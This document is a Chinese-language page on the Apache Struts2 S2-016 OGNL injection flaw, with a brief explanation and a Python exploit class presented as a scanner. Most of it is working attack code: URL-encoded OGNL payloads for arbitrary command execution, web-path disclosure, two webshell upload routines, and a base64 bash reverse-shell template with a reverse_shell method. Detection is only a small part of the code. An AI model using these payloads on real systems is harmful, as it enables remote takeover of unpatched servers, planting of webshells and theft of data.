# S2-016 远程代码执行漏洞

影响版本: 2.0.0 - 2.3.15


在struts2中，DefaultActionMapper类支持以"action:"、"redirect:"、"redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。

所以，访问http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式。

## 扫描器
`注意url要填url/index.action`

```python
class S2_016:
    """S2-016漏洞检测利用类"""
    info = "[+] S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传"
    check_poc = "redirect%3A%24%7B{num1}%2B{num2}%7D"
    web_path = "redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
    exec_payload1 = "redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B{cmd}%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D"
    exec_payload2 = "redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22{cmd}%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D"
    exec_payload3 = r"redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27CMD%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27ENCODING%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}"
    upload_payload1 = r"""redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22O%22),%23res.getWriter().print(%22K%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%22PATH%22)).append(%23req.getParameter(%22t%22)).close()}&t=SHELL"""
    upload_payload2 = "redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%22{path}%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%22OK%22)%2C%23genxor.flush()%2C%23genxor.close()%7D"
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        self.exec_payload = "payload1"
        self.exec_dict = {"payload1": self.exec_cmd1, "payload2": self.exec_cmd2, "payload3": self.exec_cmd3}
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.format(num1=num1, num2=num2)
        html = get(self.url + '?' + poc, self.headers, self.encoding)
        nn = str(num1 + num2)
        if html.startswith("ERROR:"):
            return html
        elif nn in html:
            self.is_vul = True
            self.select_exec()
            return 'S2-016'
        return self.is_vul

    def get_path(self):
        """获取web目录"""
        html = get(self.url + "?" + self.web_path, self.headers, self.encoding)
        return html

    def echo_check(self, exec_fun):
        """通过echo输出检查漏洞是否存在"""
        hash_str = get_hash()
        html = exec_fun("echo " + hash_str)
        if hash_str in html:
            return True
        else:
            return False

    def select_exec(self):
        """选择合适的执行命令的exp"""
        result = self.echo_check(self.exec_cmd1)
        if result:
            self.exec_payload = "payload1"
        else:
            result = self.echo_check(self.exec_cmd2)
            if result:
                self.exec_payload = "payload2"
            else:
                result = self.echo_check(self.exec_cmd3)
                if result:
                    self.exec_payload = "payload3"
                else:
                    self.exec_payload = "None"

    def exec_cmd(self, cmd):
        if self.exec_payload not in self.exec_dict:
            # print("[+] 本程序S2_016预设EXP对 {url} 无效!".format(url=self.url))
            return None
        result = self.exec_dict.get(self.exec_payload)(cmd)
        return result

    def exec_cmd1(self, cmd):
        """执行命令"""
        cmd = parse_cmd(cmd)
        html = get(self.url + "?" + self.exec_payload1.format(cmd=quote(cmd)), self.headers,
                   self.encoding)
        return html

    def exec_cmd2(self, cmd):
        """执行命令"""
        html = get(self.url + "?" + self.exec_payload2.format(cmd=quote(cmd)), self.headers,
                   self.encoding)
        return html

    def exec_cmd3(self, cmd):
        """执行命令"""
        html = get(self.url + "?" + self.exec_payload3.replace('CMD', quote(cmd)).replace('ENCODING', self.encoding),
                   self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html

    def upload_shell1(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        data = self.upload_payload1.replace('PATH', quote(upload_path)).replace('SHELL', quote(shell))
        html = post(self.url, data, self.headers, self.encoding)
        if html == 'OK':
            return True
        else:
            return False

    def upload_shell2(self, upload_path, shell_path):
        shell = read_file(shell_path, self.encoding)
        data = "t=" + quote(shell)
        web_path = self.get_path()
        upload_path = upload_path.replace(web_path, '')
        html = post(self.url + '?' + self.upload_payload2.format(path=upload_path), data, self.headers, self.encoding)
        if html == 'OK':
            return True
        else:
            return False

    def upload_shell(self, upload_path, shell_path):
        result = self.upload_shell1(upload_path, shell_path)
        if not result:
            result = self.upload_shell2(upload_path, shell_path)
        return result

```
